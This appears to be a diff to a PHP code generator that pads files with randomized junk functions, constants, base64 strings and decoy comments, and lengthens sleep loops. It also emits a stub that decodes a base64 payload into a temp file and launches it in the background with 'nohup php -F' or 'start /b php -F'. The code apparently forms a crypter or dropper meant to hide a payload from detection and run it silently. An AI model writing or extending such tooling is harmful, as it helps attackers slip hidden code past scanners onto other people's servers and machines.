@@ -3,7 +3,7 @@ define('allowed_chars',"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
 
 class dynamic_generator
 {
-    private function junkLoops(bool $needsleep, int $sleep_depth)
+    private function junkLoops(bool $needsleep, int $sleep_depth):array
     {
         $types = array(
             1 => "array",
@@ -22,53 +22,72 @@ class dynamic_generator
             3 => "||",
             4 => "&&"
         );
+        $checks = array(
+            1 => "is_null",
+            2 => "empty",
+            3 => "isset",
+        );
+        $pos_neg = array(
+            1 => "!",
+            2 => ""
+        );
         $sleeper = null;
-        $a = "function " . substr(str_shuffle(allowed_chars), 0, rand(3, 15)) . "(" . $types[rand(1, 3)] . " \$" . substr(str_shuffle(allowed_chars), 0, rand(3, 15)) . ")\n{\n";
         switch ($needsleep) {
             case true:
                 $for_looper = substr(str_shuffle(allowed_chars), 0, rand(3, 15));
+                $foreach_key = substr(str_shuffle(allowed_chars), 0, rand(3, 15));
+                $foreach_value = substr(str_shuffle(allowed_chars), 0, rand(3, 15));
                 if ($sleep_depth > 5) {
-                    $sleep_length = rand(1000, 5000);
+                    $sleep_length = rand(10000, 50000);
                 } else {
-                    $sleep_length = rand(100, 900);
+                    $sleep_length = rand(1000, 9000);
                 }
                 $sleeper = <<<SLEEPER
-\t$loop_types[4] ( $for_looper as ){\n\t
+$loop_types[4] ( \$$for_looper as \$$foreach_key => \$$foreach_value ){\n\t
+\tfor (\$i = 0; \$i < 
 
 SLEEPER;
-                return $sleeper;
+                return array(
+                    "loop_chunk" => $sleeper,
+                    "foreach_key" => $for_looper
+                );
             case false:
                 $looper = $loop_types[rand(1, 2)];
                 $sleeper = <<<SLEEPER
                 \t (substr(str_shuffle(allowed_chars), 0, rand(3,15))){\n\t;
 
                 SLEEPER;
-                return $sleeper;
+                return array(
+                    "1" => $sleeper
+                );
         }
+        return array(
+            "skip"=>true
+        );
     }
 
     private function randomString(){
         $a = '';
         switch (rand(0,15)){
             case 0:
-                $f_name = substr(str_shuffle(allowed_chars), 0, rand(3,15));
-                $a = "function ". $f_name . "(string \$". substr(str_shuffle(allowed_chars), 0, rand(3,15)) ."){\n";
-                for ($i = 0; $i <= rand(1,10); $i++) {
-                    $a .= "\t\$" . substr(str_shuffle(allowed_chars), 0, rand(3, 15)) . " = \"" . bin2hex(random_bytes(rand(3, 10))) . "\";\n";
+                $f_name = substr(str_shuffle(allowed_chars), 0, rand(3,45));
+                $a = "function ". $f_name . "(string \$". substr(str_shuffle(allowed_chars), 0, rand(3,45)) ."){\n";
+                for ($i = 0; $i <= rand(1,15); $i++) {
+                    $a .= "\t\$" . substr(str_shuffle(allowed_chars), 0, rand(3, 45)) . " = \"" . bin2hex(random_bytes(rand(3, 70))) . "\";\n";
                 }
                 $a .= "\treturn false;\n}\n\n";
-                $a .= "{$f_name}('" . substr(str_shuffle(allowed_chars), 0, rand(3,15)) . "');\n";
+                $a .= "{$f_name}('" . substr(str_shuffle(allowed_chars), 0, rand(3,45)) . "');\n";
                 break;
             case 1|3|5|7|9:
                 $junked = array(
-                    "1" => substr(str_shuffle(allowed_chars), 0, rand(3,15)),
-                    "2" => base64_encode(substr(str_shuffle(allowed_chars), 0, rand(3,15))),
-                    "3" => bin2hex(random_bytes(rand(5,10)))
+                    "1" => substr(str_shuffle(allowed_chars), 0, rand(3,80)),
+                    "2" => base64_encode(substr(str_shuffle(allowed_chars), 0, rand(3,80))),
+                    "3" => bin2hex(random_bytes(rand(5,80)))
                 );
                 $a = "\$". substr(str_shuffle(allowed_chars), 0, rand(3,15)) . " = \"". $junked[rand(1,3)] . "\";\n";
                 break;
             case 2|4|6|8|10:
-                $a = "define('" . bin2hex(random_bytes(rand(3, 10))) . "', \"" . bin2hex(random_bytes(rand(5, 100))) . "\");\n";
+                $a = "define('" . bin2hex(random_bytes(rand(3, 90))) . "', \"" . bin2hex(random_bytes(rand(5, 100))) . "\");\n";
                 break;
             case 11:
 
@@ -77,13 +96,14 @@ SLEEPER;
                 $a = "define('". bin2hex(random_bytes(rand(1,35))) . "', \"" . bin2hex(random_bytes(rand(5,100))) . "\");\n";
                 break;
             case 13:
-                $a = "\$tmp = tmpfile();\nfwrite(\$tmp,\"".substr(str_shuffle(allowed_chars), 0, rand(3,15))."\");\n";
+                $obfs_tmp = substr(str_shuffle(allowed_chars), 0, rand(3,15));
+                $a = "\$" . $obfs_tmp . " = tmpfile();\nfwrite(\$".$obfs_tmp.",\"".substr(str_shuffle(allowed_chars), 0, rand(3,15))."\");\n";
                 for ($i = 0; $i <= rand(10,15); $i++) {
-                    $a .= "fwrite(\$tmp, \"" . base64_encode(substr(str_shuffle(allowed_chars), 0, rand(3, 15))) . "\");\n";
+                    $a .= "fwrite(\$".$obfs_tmp.", \"" . base64_encode(substr(str_shuffle(allowed_chars), 0, rand(3, 15))) . "\");\n";
                 }
-                $a .= "fseek(\$tmp, 0);\n";
-                $a .= "\$".substr(str_shuffle(allowed_chars), 0, rand(1,10))." = file(\$tmp);\n";
-                $a .= "fclose(\$tmp);\n";
+                $a .= "fseek(\$".$obfs_tmp.", 0);\n";
+                $a .= "\$".substr(str_shuffle(allowed_chars), 0, rand(1,90))." = file(\$".$obfs_tmp.");\n";
+                $a .= "fclose(\$".$obfs_tmp.");\n";
                 break;
             case 14:
                 $a = "// why is it not launching??????\n";
@@ -92,12 +112,21 @@ SLEEPER;
                 $yy = rand(1997,(int)date("Y"));
                 $mo = rand(1,12);
                 $dd = rand(1,31);
-                $a = "//created: \n". date("Y/m/d - l", mktime(null, null, null, $mo, $dd, $yy));
+                $a  .= "//created: \n". date("Y/m/d - l", mktime(null, null, null, $mo, $dd, $yy));
                 break;
         }
         return $a;
     }
 
+    private function encryptFile($filename):bool
+    {
+        if (!empty($filename) and is_file($filename)){
+
+        }else{
+            return false;
+        }
+        return false;
+    }
 
     function begin_junk($file, $depth, $out, $mode)
     {
@@ -225,7 +254,7 @@ function $fun(string \$$values)
     \$$tt = tempnam(sys_get_temp_dir(),"$tt_name");
     fwrite(fopen(\$$tt, "a+"), base64_decode(\$$da));
     if (substr(php_uname(), 0, 7) == 'Windows') {
-        system("start /b php \$$tt");
+        system("start /b php -F \$$tt");
     }else{
         system("nohup php -F \$$tt &");
     }
